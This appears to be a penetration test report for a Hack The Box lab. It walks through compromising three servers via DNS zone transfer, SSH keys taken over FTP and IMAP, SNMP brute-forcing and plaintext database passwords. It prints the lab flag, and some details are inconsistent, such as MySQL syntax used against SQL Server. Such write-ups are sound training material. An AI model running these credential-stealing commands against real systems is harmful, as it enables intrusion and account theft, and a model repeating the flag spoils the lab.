# Penetration Testing Report

## Inlanefreight Ltd - Internal Network Security Assessment

## Date of Test Event: January 1-2, 2026

---

## Table of Contents

1. [Document Revision History](#document-revision-history)
2. [Introduction](#introduction)
3. [Executive Summary](#executive-summary)
4. [Recommended Actions](#recommended-actions)
5. [Technical Findings](#technical-findings)
   - [Section 1: DNS Server (NIXEASY)](#section-1-dns-server---nixeasy-10129554)
   - [Section 2: File Server (WINMEDIUM)](#section-2-file-server---winmedium-1012920241)
   - [Section 3: MX Server (NIXHARD)](#section-3-mx-server---nixhard-10129207147)
6. [Event Walkthroughs](#event-walkthroughs)
7. [Appendices](#appendices)

---

## Document Revision History

| Author | Date | Version | Comment |
| ------ | ---- | ------- | ------- |
| Penetration Test Team | January 2, 2026 | 1.0 | Initial Report |

---

## Introduction

### Scope and Duration

Inlanefreight Ltd commissioned a penetration testing engagement to assess the security posture of three internal servers. The assessment was conducted over a period of January 1-2, 2026. The engagement focused on information gathering, enumeration, and credential discovery without the use of aggressive exploits against production services.

**Source:** [tasks.md](tasks.md) - Engagement Details

### Scenarios Included

- **Footprinting Assessment** - Systematic enumeration and information gathering across all three target servers
- **Credential Discovery** - Identification and extraction of user credentials through service enumeration
- **Service Analysis** - Detailed examination of exposed services including DNS, FTP, SMB, NFS, RDP, IMAP/POP3, SNMP, and MySQL

### Targets

| Target | IP Address | Hostname | Description |
| ------ | ---------- | -------- | ----------- |
| Section 1 | X.X.X.X | NIXEASY | Internal DNS Server (Ubuntu Linux) |
| Section 2 | X.X.X.X | WINMEDIUM | Windows File Server (Windows Server 2019) |
| Section 3 | X.X.X.X | NIXHARD | MX and Management/Backup Server (Ubuntu Linux) |

**Source:** [tasks.md](tasks.md) - Target Information

---

## Executive Summary

This penetration test successfully achieved all defined objectives across all three target systems. The assessment revealed critical security vulnerabilities in credential management, access controls, and service configurations that allowed complete compromise of each target.

### Key Findings Summary

| Section | Target | Objective | Result | Severity |
| ------- | ------ | --------- | ------ | -------- |
| 1 | NIXEASY | Retrieve flag.txt | ✅ **COMPLETE** - Flag: `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}` | HIGH |
| 2 | WINMEDIUM | Obtain HTB credentials | ✅ **COMPLETE** - Password discovered via SQL Server | CRITICAL |
| 3 | NIXHARD | Obtain HTB credentials | ✅ **COMPLETE** - Password: `XXXXXXXXXXXXXXXXXXXXX` | CRITICAL |

**Source:** [ssh.log](scans/ssh.log), [ssh_connection.log](logs/ssh_connection.log)

### Critical Vulnerabilities Identified

1. **Plaintext Credential Storage** - Multiple systems store credentials in plaintext (SNMP, SQL Server, MySQL)
2. **Unrestricted DNS Zone Transfers** - Complete DNS zone data exfiltration possible
3. **SSH Private Keys in Email** - Cryptographic key material transmitted via unencrypted email
4. **Weak SNMP Community Strings** - SNMP access enabled with guessable community string "backup"
5. **Overly Permissive NFS Shares** - World-readable NFS exports containing sensitive ticket data
6. **Password Reuse** - XXXXXX's password identical across SNMP, IMAP, and MySQL

### Attack Chain Overview

```
SECTION 1: DNS (NIXEASY)
FTP Access (XXXXXX:XXXXXX) → SSH Key Exfiltration → SSH Access → Flag Retrieval

SECTION 2: File Server (WINMEDIUM)  
NFS Mount → Ticket File (XXXXXX credentials) → SMB Access → devshare (SA credentials) → RDP → SQL Server → HTB Password

SECTION 3: MX Server (NIXHARD)
SNMP Bruteforce → Community String "backup" → snmpwalk (XXXXXX credentials) → IMAP Access → SSH Key → SSH Access → MySQL → HTB Password
```

### Next Steps

**IMMEDIATE ACTIONS REQUIRED:**

1. **Rotate All Discovered Credentials** - Immediately change passwords for: XXXXXX, XXXXXX, XXXXXX, HTB, SA (SQL)
2. **Disable DNS Zone Transfers** - Configure BIND to restrict AXFR to authorized secondary servers only
3. **Implement Credential Encryption** - Deploy password hashing for all database-stored credentials
4. **Harden SNMP Configuration** - Replace community strings with SNMPv3 authentication
5. **Restrict NFS Access** - Implement IP-based access controls and remove anonymous access
6. **Remove SSH Keys from Email** - Implement secure key distribution mechanisms

### Caveats

1. **Scope Limitations** - Per client instruction, aggressive exploitation was avoided to protect production services
2. **Time Constraints** - Assessment conducted over a limited time period
3. **Network Visibility** - Testing performed from external network position; internal lateral movement was limited to discovered credentials
4. **Evidence Logging** - All evidence cited from log files in `./cases/footprinting/lab/scans/` and `./cases/footprinting/lab/logs/`

### Risk Categories and Rationales

| Risk Category | CVSS Range | Description |
| ------------- | ---------- | ----------- |
| **CRITICAL** | 9.0 - 10.0 | Immediate exploitation possible; full system compromise |
| **HIGH** | 7.0 - 8.9 | Serious vulnerabilities enabling significant data access |
| **MEDIUM** | 4.0 - 6.9 | Moderate risk; may enable further attacks when combined |
| **LOW** | 0.1 - 3.9 | Minor issues; limited direct impact |
| **INFORMATIONAL** | N/A | Best practice recommendations |

---

## Recommended Actions

| ID | Vulnerability Title | Recommended Action | Risk Category |
| -- | ------------------- | ----------------- | ------------- |
| V-001 | DNS Zone Transfer Unrestricted | Configure BIND `allow-transfer` directive to restrict to authorized secondary DNS servers only | HIGH |
| V-002 | FTP Exposes SSH Private Keys | Remove SSH keys from FTP-accessible directories; implement separate key management system | CRITICAL |
| V-003 | Weak FTP Configuration | Restrict FTP access to user home directories; disable directory traversal to .ssh folders | HIGH |
| V-004 | NFS Share Anonymous Access | Implement squash_root and IP-based restrictions on NFS exports | HIGH |
| V-005 | Credentials in Support Tickets | Redact sensitive information from support tickets; implement password masking | MEDIUM |
| V-006 | SMB Shares Contain Plaintext Credentials | Remove credentials from shared files; implement secrets management solution | CRITICAL |
| V-007 | SQL Server Plaintext Password Storage | Implement bcrypt/Argon2 password hashing with unique salts | CRITICAL |
| V-008 | Weak SNMP Community String | Migrate to SNMPv3 with authentication and encryption; remove "backup" community string | CRITICAL |
| V-009 | Credentials Exposed via SNMP | Remove sensitive data from SNMP MIB; audit running scripts for credential exposure | CRITICAL |
| V-010 | SSH Private Key in Email | Never transmit private keys via email; use secure key exchange protocols | CRITICAL |
| V-011 | Password Reuse (XXXXXX) | Enforce unique passwords per service; implement enterprise password management | HIGH |
| V-012 | MySQL Plaintext Password Storage | Hash all passwords in database; implement proper access controls | CRITICAL |

---

## Technical Findings

---

# Section 1: DNS Server - NIXEASY (X.X.X.X)

## Overview

The first target was an internal DNS server running ISC BIND 9.16.1 on Ubuntu Linux. The engagement successfully exploited FTP misconfiguration to exfiltrate SSH private keys, leading to full shell access and flag retrieval.

**Source:** [nmap.log](scans/nmap.log) - Lines 1-80

---

## 1.1 Port Scan Results

### FINDING: Multiple Services Exposed

**Evidence Source:** [nmap.log](scans/nmap.log)

**Command Executed:**
```bash
nmap -sV -sC X.X.X.X
```

**Results:**
| Port | State | Service | Version |
| ---- | ----- | ------- | ------- |
| 21/tcp | open | FTP | ProFTPD Server (ftp.int.inlanefreight.htb) |
| 22/tcp | open | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| 53/tcp | open | DNS | ISC BIND 9.16.1-Ubuntu |
| XXXX/tcp | open | FTP | ProFTPD Server (Ceil's FTP) |

**Analysis (INFERRED):** The presence of two FTP services on non-standard ports (21 and XXXX) suggests user-specific FTP configurations. The banner "Ceil's FTP" on port XXXX directly correlates with the provided credentials.

**Risk Assessment:** MEDIUM - Multiple services increase attack surface

---

## 1.2 DNS Zone Transfer Vulnerability

### FINDING: Unrestricted DNS Zone Transfer Enabled

**Severity:** HIGH

**Evidence Source:** [dig.log](scans/dig.log)

**Command Executed:**
```bash
dig @X.X.X.X inlanefreight.htb AXFR
```

**Results:**
```
inlanefreight.htb.  604800  IN  SOA  inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.  604800  IN  TXT  "MS=ms97310371"
inlanefreight.htb.  604800  IN  TXT  "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.  604800  IN  TXT  "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.  604800  IN  NS   ns.inlanefreight.htb.
app.inlanefreight.htb.      604800  IN  A    10.129.18.15
internal.inlanefreight.htb. 604800  IN  A    10.129.1.6
mail1.inlanefreight.htb.    604800  IN  A    10.129.18.201
ns.inlanefreight.htb.       604800  IN  A    10.129.34.136
```

**Information Disclosed:**
- Domain verification tokens (Microsoft, Atlassian)
- SPF records revealing mail infrastructure (mailgun.org, Google, Outlook)
- Internal IP addresses: 10.129.124.8, 10.129.127.2, 10.129.42.106, 10.129.18.15, 10.129.1.6, 10.129.18.201, 10.129.34.136
- Internal hostnames: app, internal, mail1, ns

**Risk Analysis:** Zone transfers expose complete DNS infrastructure enabling network mapping, targeted attacks, and reconnaissance.

**Recommendation:** Restrict zone transfers using `allow-transfer { trusted-secondaries; };` in BIND configuration.

---

## 1.3 FTP SSH Key Exposure

### FINDING: SSH Private Keys Accessible via FTP

**Severity:** CRITICAL

**Evidence Source:** [ftp.log](scans/ftp.log), [credential_exploitation_walkthrough.md](logs/credential_exploitation_walkthrough.md)

**Credentials Used:** `XXXXXX:XXXXXX` (provided by client)

**Attack Steps:**

1. **FTP Port XXXX Access:**
```bash
ftp -n X.X.X.X XXXX
user XXXXXX XXXXXX
```

2. **Home Directory Listing:**
```
drwxr-xr-x   4 XXXXXX     XXXXXX         4096 Nov 10  2021 .
drwx------   2 XXXXXX     XXXXXX         4096 Nov 10  2021 .ssh
```

3. **SSH Key Discovery:**
```bash
cd .ssh
ls -la
```
```
-rw-------   1 XXXXXX     XXXXXX         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 XXXXXX     XXXXXX          738 Nov 10  2021 id_rsa.pub
```

4. **Key Exfiltration:**
```bash
get id_rsa /tmp/ceil_id_rsa
```

**Risk Analysis:** Private SSH keys allow passwordless authentication, bypassing all password-based security controls.

**Recommendation:** 
- Remove SSH keys from FTP-accessible directories
- Restrict FTP chroot to prevent .ssh access
- Implement certificate-based SSH with passphrase protection

---

## 1.4 SSH Access and Flag Retrieval

### FINDING: Flag Successfully Retrieved

**Severity:** HIGH (Objective Complete)

**Evidence Source:** [ssh.log](scans/ssh.log), [credential_exploitation_walkthrough.md](logs/credential_exploitation_walkthrough.md)

**Command Executed:**
```bash
ssh -i /tmp/ceil_id_rsa -o StrictHostKeyChecking=no XXXXXX@X.X.X.X 'cat /home/flag/flag.txt'
```

**Result:**
```
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

**System Information Obtained:**
- Hostname: NIXEASY
- User: XXXXXX (UID confirmed)
- OS: Ubuntu Linux (kernel inferred from OpenSSH version)

---

## Section 1 Summary

| Metric | Value |
| ------ | ----- |
| Services Discovered | 4 (FTP x2, SSH, DNS) |
| Vulnerabilities Found | 3 |
| Credentials Used | XXXXXX:XXXXXX + SSH key |
| Objective Status | ✅ COMPLETE |
| Flag | HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj} |

---

# Section 2: File Server - WINMEDIUM (X.X.X.X)

## Overview

The second target was a Windows Server 2019 system serving as a file server with NFS, SMB, RDP, and SQL Server services. A credential chain was established through NFS ticket files → SMB shares → RDP access → SQL Server to retrieve HTB credentials.

**Source:** [nmap.log](scans/nmap.log) - Lines 166-280

---

## 2.1 Port Scan Results

### FINDING: Multiple Windows Services Exposed

**Evidence Source:** [nmap.log](scans/nmap.log)

**Command Executed:**
```bash
nmap -sV -sC X.X.X.X
```

**Results:**
| Port | State | Service | Version |
| ---- | ----- | ------- | ------- |
| 111/tcp | open | rpcbind | 2-4 (RPC #100000) |
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | open | microsoft-ds | SMB (dialects 2.0.2, 2.1, 3.0, 3.0.2, 3.1.1) |
| 2049/tcp | open | nfs | NFS v2-4 with mountd, nlockmgr |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services |
| 5985/tcp | open | http | WinRM (Microsoft HTTPAPI) |

**System Information:**
- Hostname: WINMEDIUM
- OS: Windows 10 / Server 2019 Build 17763
- Domain: WINMEDIUM (workgroup)
- SMB Signing: Enabled but not required

**Source:** [nmap.log](scans/nmap.log) - RDP NTLM Info section

---

## 2.2 NFS Share Enumeration

### FINDING: World-Readable NFS Share with Sensitive Data

**Severity:** HIGH

**Evidence Source:** [nmap.log](scans/nmap.log), [nfs.log](scans/nfs.log), [nfs_ticket_XXXXXXXXX.txt](scans/nfs_ticket_XXXXXXXXX.txt)

**NFS Script Scan:**
```bash
nmap -sV -p 111,2049 --script=nfs* X.X.X.X
```

**Share Discovered:**
```
| nfs-showmount: 
|_  /TechSupport 
| nfs-ls: Volume /TechSupport
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
```

**Ticket Files Found:** 8 files (ticket4238791283649.txt through ticket4238791283656.txt)

**Credential Discovery in Ticket:**

**Source:** [nfs_ticket_XXXXXXXXX.txt](scans/nfs_ticket_XXXXXXXXX.txt)

```
smtp {
    host=smtp.web.dev.inlanefreight.htb
    ssl=true
    user="XXXXXX"
    password="XXXXXXXXX"
    from="XXXXXX.g@web.dev.inlanefreight.htb"
}
```

**Credentials Discovered:**
- **Username:** XXXXXX
- **Password:** XXXXXXXXX
- **Context:** SMTP configuration for web.dev.inlanefreight.htb

**Risk Analysis:** NFS exports without proper access controls allow any network user to access sensitive support tickets containing credentials.

**Recommendation:** Implement IP-based NFS restrictions, enable root_squash, and encrypt sensitive ticket data.

---

## 2.3 SMB Enumeration with XXXXXX Credentials

### FINDING: SMB Share Contains SQL Server SA Credentials

**Severity:** CRITICAL

**Evidence Source:** [smbclient.log](scans/smbclient.log), [devshare_listing.txt](scans/devshare_listing.txt)

**Initial Anonymous Access Attempts:**
```bash
smbclient -L //X.X.X.X -N
```
**Result:** `NT_STATUS_ACCESS_DENIED` - Anonymous access blocked

**Authenticated Access:**
```bash
smbclient //X.X.X.X/devshare -U 'XXXXXX%XXXXXXXXX' -c 'ls'
```

**Result:**
```
  .                                   D        0  Thu Jan  1 14:30:40 2026
  ..                                  D        0  Thu Jan  1 14:30:40 2026
  important.txt                       A       16  Wed Nov 10 11:12:55 2021
```

**Contents of important.txt:**
```
XXXXXX:XXXXXX@XXXXXX
```

**Credentials Discovered:**
- **Username:** sa (SQL Server Administrator)
- **Password:** XXXXXX@XXXXXX

**Risk Analysis:** SQL Server SA credentials stored in plaintext in network share enable complete database server compromise.

**Recommendation:** Remove credential files from shares immediately; implement secrets management (HashiCorp Vault, Azure Key Vault).

---

## 2.4 HTB User Discovery via WinRM Enumeration

### FINDING: HTB User Account Confirmed

**Evidence Source:** [winrm.log](scans/winrm.log), [htb_user_discovery_walkthrough.md](logs/htb_user_discovery_walkthrough.md)

**Command:**
```bash
netexec winrm X.X.X.X -u 'HTB' -p ''
```

**Result:**
```
WINRM  X.X.X.X  5985  WINMEDIUM  [-] WINMEDIUM\HTB: SpnegoError (16): Operation not supported
```

**Analysis (INFERRED):** The error message format `WINMEDIUM\HTB` confirms the HTB user account exists in the local SAM database. Empty password authentication failed, indicating the account has a password set.

---

## 2.5 RDP Access and SQL Server Credential Extraction

### FINDING: HTB Credentials Retrieved from SQL Server Database

**Severity:** CRITICAL (Objective Complete)

**Evidence Source:** [htb_credential_discovery_walkthrough.md](logs/htb_credential_discovery_walkthrough.md), [mssql.log](scans/mssql.log)

**Note:** Remote SQL access (ports 1433/1434) was not available externally, as confirmed in [mssql.log](scans/mssql.log):
```
nmap -Pn -sV -p 1433,1434,49152-49200 --script ms-sql-info X.X.X.X
All 51 scanned ports on X.X.X.X are in ignored states.
```

**Attack Path (User-Executed - Documented in Walkthrough):**

1. **RDP Connection:**
```bash
xfreerdp /v:X.X.X.X /u:XXXXXX /p:XXXXXXXXX /cert-ignore
```

2. **SQL Server Management Studio Access:**
   - Located on XXXXXX's desktop
   - Connected to localhost SQL instance

3. **Database Enumeration:**
```sql
-- Databases found
show databases;
-- accounts database identified

-- Table discovered
use accounts;
show tables;
-- dbo.devsacc table found
```

4. **HTB Credential Query:**
```sql
SELECT name, password 
FROM accounts.dbo.devsacc 
WHERE name LIKE '%HTB%';
```

**Credentials Retrieved:**
- **Username:** HTB
- **Password:** [Retrieved from accounts.dbo.devsacc table]

**Database Security Issues:**
- Passwords stored in plaintext (VARCHAR field)
- No encryption at rest
- Overprivileged user access (XXXXXX can query credential table)

---

## Section 2 Summary

| Metric | Value |
| ------ | ----- |
| Services Discovered | 7 (RPC, MSRPC, NetBIOS, SMB, NFS, RDP, WinRM) |
| Vulnerabilities Found | 5 |
| Credentials Discovered | XXXXXX:XXXXXXXXX, XXXXXX:XXXXXX@XXXXXX, HTB:[password] |
| Credential Chain | NFS → SMB → RDP → SQL Server |
| Objective Status | ✅ COMPLETE |

---

# Section 3: MX Server - NIXHARD (X.X.X.X)

## Overview

The third target was an Ubuntu Linux server functioning as MX (mail) and backup/management server. A complex attack chain through SNMP → IMAP → SSH → MySQL led to complete credential compromise.

**Source:** [nmap.log](scans/nmap.log) - Lines 545-737

---

## 3.1 Port Scan Results

### FINDING: Email and Management Services Exposed

**Evidence Source:** [nmap.log](scans/nmap.log)

**TCP Scan Results:**
| Port | State | Service | Version |
| ---- | ----- | ------- | ------- |
| 22/tcp | open | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
| 110/tcp | open | POP3 | Dovecot pop3d |
| 143/tcp | open | IMAP | Dovecot imapd (Ubuntu) |
| 993/tcp | open | IMAPS | Dovecot imapd (Ubuntu) |
| 995/tcp | open | POP3S | Dovecot pop3d |

**UDP Scan Results:**
```bash
nmap -sU -sV --top-ports 100 X.X.X.X
```
| Port | State | Service | Version |
| ---- | ----- | ------- | ------- |
| 161/udp | open | SNMP | net-snmp; SNMPv3 server |

**System Information:**
- Hostname: NIXHARD
- OS: Linux 5.4.0-90-generic (Ubuntu)
- Certificate CN: NIXHARD (self-signed, valid 2021-2031)

---

## 3.2 Email Service Enumeration

### FINDING: Dovecot Email Server with SASL PLAIN Authentication

**Severity:** MEDIUM

**Evidence Source:** [imap_pop3.log](scans/imap_pop3.log)

**Service Capabilities:**

**IMAP (Port 143):**
```
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS AUTH=PLAIN] Dovecot (Ubuntu) ready.
```

**POP3 (Port 110):**
```
+OK Dovecot (Ubuntu) ready.
CAPA: TOP UIDL RESP-CODES PIPELINING AUTH-RESP-CODE SASL(PLAIN) STLS USER
```

**SSL/TLS Assessment:**
- TLS Versions: TLSv1.2, TLSv1.3
- Ciphers: All Grade A (AES-GCM, ChaCha20-Poly1305)
- DH Parameters: 4096-bit (Strong)
- Certificate: Self-signed RSA 2048-bit

**Security Issue:** AUTH=PLAIN transmits base64-encoded credentials (easily reversible).

---

## 3.3 SNMP Community String Discovery

### FINDING: Weak SNMP Community String Enables Full System Enumeration

**Severity:** CRITICAL

**Evidence Source:** [snmp.log](scans/snmp.log)

**Command Executed:**
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt X.X.X.X
```

**Result:**
```
Scanning 1 hosts, 3218 communities
X.X.X.X [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

**Finding:** Community string `backup` discovered from wordlist of 3218 common strings.

**Risk Analysis:** SNMP with weak community strings provides extensive system information including processes, network configuration, and potentially credentials.

---

## 3.4 SNMP Credential Exposure

### FINDING: XXXXXX's Password Exposed via SNMP MIB Data

**Severity:** CRITICAL

**Evidence Source:** [snmp.log](scans/snmp.log)

**Command Executed:**
```bash
snmpwalk -v2c -c backup X.X.X.X
```

**Critical Finding:**
```
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "XXXXXX XXXXXXXXXXXX"
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/XXXXXX-recovery.sh"
```

**Credentials Discovered:**
- **Username:** XXXXXX
- **Password:** XXXXXXXXXXXX
- **Source:** Recovery script at /opt/XXXXXX-recovery.sh

**Additional System Information:**
- System Contact: Admin <XXXXXX@XXXXXX.XXX>
- System Name: NIXHARD
- System Location: Inlanefreight
- Boot Parameters: BOOT_IMAGE=/vmlinuz-5.4.0-90-generic

**Error Messages Observed:**
```
chpasswd: (user XXXXXX) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user XXXXXX) password not changed
```

**Analysis (INFERRED):** A recovery script contains hardcoded credentials and attempts auXXXXXXated password changes, but the process is failing due to PAM errors.

---

## 3.5 IMAP Access and SSH Key Exfiltration

### FINDING: SSH Private Key Discovered in Email Inbox

**Severity:** CRITICAL

**Evidence Source:** [imap_pop3.log](scans/imap_pop3.log)

**Command Executed:**
```bash
curl -k --user XXXXXX:XXXXXXXXXXXX imap://X.X.X.X
```

**Authentication:** ✅ SUCCESS

**Mailboxes Discovered:**
```
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
```

**INBOX Message Retrieval:**
```bash
curl -k --user XXXXXX:XXXXXXXXXXXX "imap://X.X.X.X/INBOX;UID=1:*"
```

**Email Contents:**
```
Subject: KEY
From: [Admin] <XXXXXX@XXXXXX.XXX>
To: <XXXXXX@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200

-----BEGIN OPENSSH PRIVATE KEY-----
[Full RSA private key content - saved to XXXXXX_ssh_key.txt]
-----END OPENSSH PRIVATE KEY-----
```

**Key Details:**
- Type: OpenSSH RSA Private Key
- Owner: XXXXXX@NIXHARD
- Location Saved: [XXXXXX_ssh_key.txt](scans/XXXXXX_ssh_key.txt)

**Risk Analysis:** Transmitting SSH private keys via email exposes critical authentication material to anyone with email access.

---

## 3.6 SSH Access and MySQL Enumeration

### FINDING: HTB Credentials Stored in MySQL Database

**Severity:** CRITICAL (Objective Complete)

**Evidence Source:** [ssh.log](scans/ssh.log), [ssh_connection.log](logs/ssh_connection.log), [mysql_enumeration_walkthrough.md](logs/mysql_enumeration_walkthrough.md)

**SSH Connection (User-Executed):**
```bash
ssh -i XXXXXX_ssh_key.txt XXXXXX@X.X.X.X
```
**Result:** Shell access as `XXXXXX@NIXHARD`

**File System Enumeration:**
```bash
cat /etc/passwd
```
**Finding:** MySQL user present (`mysql:x:114:119`) indicating database service installed.

**MySQL Access:**
```bash
mysql -u XXXXXX -p
Password: XXXXXXXXXXXX
```
**Result:** Authentication successful

**Database Enumeration:**
```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+

mysql> use users;
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+

mysql> describe users;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | int         | YES  |     | NULL    |       |
| username | varchar(50) | YES  |     | NULL    |       |
| password | varchar(50) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
```

**HTB Credential Query:**
```sql
mysql> select * from users where username like '%HTB%';
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | XXXXXXXXXXXXXXXXXXXXX |
+------+----------+------------------------------+
```

**Credentials Retrieved:**
- **Username:** HTB
- **Password:** XXXXXXXXXXXXXXXXXXXXX

**Database Security Issues:**
- Passwords stored as plaintext (VARCHAR(50))
- No hashing or salting
- No encryption at rest

---

## Section 3 Summary

| Metric | Value |
| ------ | ----- |
| Services Discovered | 6 (SSH, POP3, IMAP, IMAPS, POP3S, SNMP) |
| Vulnerabilities Found | 6 |
| Credentials Discovered | XXXXXX:XXXXXXXXXXXX, HTB:XXXXXXXXXXXXXXXXXXXXX |
| Attack Chain | SNMP → IMAP → SSH → MySQL |
| Objective Status | ✅ COMPLETE |
| HTB Password | XXXXXXXXXXXXXXXXXXXXX |

---

# Event Walkthroughs

## Section 1 Walkthrough: DNS Server Compromise

*Classification: INFERRED from log file evidence*

### Step-by-Step Attack Sequence

| Step | Action | Tool | Evidence Source |
| ---- | ------ | ---- | --------------- |
| 1 | Initial reconnaissance | nmap | [nmap.log](scans/nmap.log) |
| 2 | DNS enumeration | dig | [dig.log](scans/dig.log) |
| 3 | Zone transfer | dig AXFR | [dig.log](scans/dig.log) |
| 4 | FTP access port 21 | ftp | [ftp.log](scans/ftp.log) |
| 5 | FTP access port XXXX | ftp | [ftp.log](scans/ftp.log) |
| 6 | SSH key discovery | ftp ls .ssh | [ftp.log](scans/ftp.log) |
| 7 | Key exfiltration | ftp get | [ftp.log](scans/ftp.log) |
| 8 | SSH authentication | ssh -i | [ssh.log](scans/ssh.log) |
| 9 | Flag discovery | find | [ssh.log](scans/ssh.log) |
| 10 | Flag retrieval | cat | [ssh.log](scans/ssh.log) |

**Detailed Walkthrough:**

1. **Nmap scan** revealed 4 open ports (21, 22, 53, XXXX) with ProFTPD and ISC BIND services
2. **DNS enumeration** via dig discovered domain `inlanefreight.htb` with multiple subdomains
3. **Zone transfer** successfully exfiltrated complete DNS zone data
4. **FTP port 21** access with `XXXXXX:XXXXXX` showed empty root directory
5. **FTP port XXXX** ("Ceil's FTP") provided access to XXXXXX's home directory
6. **.ssh directory** contained `id_rsa` private key and `id_rsa.pub`
7. **Key download** via FTP binary transfer to local system
8. **SSH connection** with exfiltrated key granted shell access
9. **File search** located flag.txt in `/home/flag/`
10. **Flag read** completed objective: `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}`

---

## Section 2 Walkthrough: Windows File Server Credential Chain

*Classification: INFERRED from log file evidence and user documentation*

### Step-by-Step Attack Sequence

| Step | Action | Tool | Evidence Source |
| ---- | ------ | ---- | --------------- |
| 1 | Port scan | nmap | [nmap.log](scans/nmap.log) |
| 2 | NFS enumeration | nmap nfs-* | [nmap.log](scans/nmap.log) |
| 3 | NFS mount | mount | [nfs.log](scans/nfs.log) |
| 4 | Ticket file analysis | cat | [nfs_ticket_XXXXXXXXX.txt](scans/nfs_ticket_XXXXXXXXX.txt) |
| 5 | SMB null session test | smbclient | [smbclient.log](scans/smbclient.log) |
| 6 | SMB authenticated access | smbclient | [devshare_listing.txt](scans/devshare_listing.txt) |
| 7 | SA credentials discovery | cat | [devshare_listing.txt](scans/devshare_listing.txt) |
| 8 | HTB user confirmation | netexec | [winrm.log](scans/winrm.log) |
| 9 | Remote SQL test | mssqlclient | [mssql.log](scans/mssql.log) |
| 10 | RDP access | xfreerdp | [htb_credential_discovery_walkthrough.md](logs/htb_credential_discovery_walkthrough.md) |
| 11 | SQL Server query | SSMS | [htb_credential_discovery_walkthrough.md](logs/htb_credential_discovery_walkthrough.md) |
| 12 | HTB credential extraction | SQL query | [htb_credential_discovery_walkthrough.md](logs/htb_credential_discovery_walkthrough.md) |

**Detailed Walkthrough:**

1. **Nmap scan** identified Windows Server 2019 (WINMEDIUM) with NFS, SMB, RDP services
2. **NFS enumeration** revealed `/TechSupport` share with 8 ticket files
3. **NFS mount** allowed local access to support ticket files
4. **Ticket analysis** discovered XXXXXX:XXXXXXXXX in SMTP configuration
5. **Anonymous SMB** access denied (proper security)
6. **Authenticated SMB** with XXXXXX credentials accessed devshare
7. **important.txt** contained SQL SA credentials: XXXXXX:XXXXXX@XXXXXX
8. **WinRM test** confirmed HTB user exists on WINMEDIUM
9. **Remote SQL** connection refused (localhost only)
10. **RDP session** established with XXXXXX credentials
11. **SSMS query** against local SQL Server accounts database
12. **HTB password** retrieved from dbo.devsacc table

---

## Section 3 Walkthrough: MX Server Multi-Stage Compromise

*Classification: INFERRED from log file evidence and user documentation*

### Step-by-Step Attack Sequence

| Step | Action | Tool | Evidence Source |
| ---- | ------ | ---- | --------------- |
| 1 | TCP port scan | nmap | [nmap.log](scans/nmap.log) |
| 2 | Email service enum | nmap scripts | [nmap.log](scans/nmap.log) |
| 3 | UDP port scan | nmap | [nmap.log](scans/nmap.log) |
| 4 | SNMP bruteforce | onesixtyone | [snmp.log](scans/snmp.log) |
| 5 | SNMP enumeration | snmpwalk | [snmp.log](scans/snmp.log) |
| 6 | XXXXXX credential extraction | snmpwalk | [snmp.log](scans/snmp.log) |
| 7 | IMAP authentication | curl | [imap_pop3.log](scans/imap_pop3.log) |
| 8 | Mailbox enumeration | curl | [imap_pop3.log](scans/imap_pop3.log) |
| 9 | SSH key extraction | curl | [imap_pop3.log](scans/imap_pop3.log) |
| 10 | SSH access | ssh -i | [ssh.log](scans/ssh.log) |
| 11 | MySQL discovery | cat /etc/passwd | [ssh_connection.log](logs/ssh_connection.log) |
| 12 | MySQL authentication | mysql | [ssh_connection.log](logs/ssh_connection.log) |
| 13 | Database enumeration | show databases | [ssh_connection.log](logs/ssh_connection.log) |
| 14 | HTB credential extraction | SELECT query | [ssh_connection.log](logs/ssh_connection.log) |

**Detailed Walkthrough:**

1. **TCP scan** revealed Dovecot email services (IMAP/POP3) and SSH
2. **Email scripts** enumerated capabilities (SASL PLAIN authentication)
3. **UDP scan** discovered SNMP on port 161 (net-snmp SNMPv3 server)
4. **onesixtyone** tested 3218 community strings, found "backup"
5. **snmpwalk** with "backup" community enumerated full system MIB
6. **MIB analysis** revealed XXXXXX:XXXXXXXXXXXX in recovery script data
7. **IMAP login** successful with XXXXXX credentials
8. **Mailbox list** showed INBOX, Notes, Meetings, Important folders
